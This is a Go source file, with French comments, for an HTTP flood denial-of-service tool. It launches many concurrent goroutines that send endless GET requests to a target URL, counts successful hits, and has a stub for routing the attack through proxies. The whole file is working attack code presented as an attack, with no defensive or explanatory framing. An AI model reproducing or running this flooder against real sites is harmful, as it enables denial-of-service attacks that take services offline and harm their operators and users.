//@uthor azseza
// Go Program that impliments the HTTPflood sequence
// in the main , thease methods will be applyed to proxy.py's output
package flood

import (
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"runtime"
	"sync/atomic"
)

type flooDDoS struct {
	url         *url.URL
	stop        *chan bool
	microBots   int64
	goodHit     int64
	nombreDeHit int64
}

//Initialisation
func Init(URL string, microBot int64) (*flooDDoS, error) {
	if microBot < 1 {
		return nil, fmt.Errorf(" Les microBots doivents etre supp à 1 !!  ")
	}
	target, ereur := url.Parse(URL)
	if ereur != nil || len(target.Host) == 0 {
		fmt.Errorf("Host indéfinit :: %v", ereur)
	}
	stopp := make(chan bool)
	return &flooDDoS{
		url:       target,
		stop:      &stopp,
		microBots: microBot,
	}, nil
}

//Fonction principale
func (d *flooDDoS) Flood() {
	//proxx := getProxy(proxAddr)
	var i int64
	for i = 0; i < d.microBots; i++ {
		go func() {
			for {
				select {
				case <-(*d.stop):
					return
				default:
					// send http GET requests
					resp, err := http.Get(d.url.String())
					atomic.AddInt64(&d.nombreDeHit, 1)
					if err == nil {
						atomic.AddInt64(&d.goodHit, 1)
						_, _ = io.Copy(ioutil.Discard, resp.Body)
						_ = resp.Body.Close()
					}
				}
				runtime.Gosched()
			}
		}()
	}
}

//Arret de l'attaque
func (d *flooDDoS) Stop() {
	var i int64
	for i = 0; i < d.microBots; i++ {
		(*d.stop) <- true
	}
	close(*d.stop)
}

//Resultat de l'attaque
func (d *flooDDoS) Statss() {
	fmt.Printf("Number of good hits : %v \n", d.goodHit)
	fmt.Printf("Number of all hits : %v \n", d.nombreDeHit)
	fmt.Printf("Performance : %f \n ", float64(d.goodHit/d.nombreDeHit))
}

//a revister pour une autre version
//function qui crée des paquets spéciaux
//func getProxy(proxx string) (client *http.Client) {
//	OKAddr := proxx // local IP address to use
//
//	OKAddress, _ := net.ResolveTCPAddr("tcp", OKAddr)
//
//	transport := &http.Transport{
//		Proxy: http.ProxyFromEnvironment,
//		Dial: (&net.Dialer{
//			Timeout:   30 * time.Second,
//			KeepAlive: 30 * time.Second,
//			LocalAddr: OKAddress}).Dial, TLSHandshakeTimeout: 10 * time.Second}
//
//	client = &http.Client{
//		Transport: transport,
//	}
//
//	return client
//}
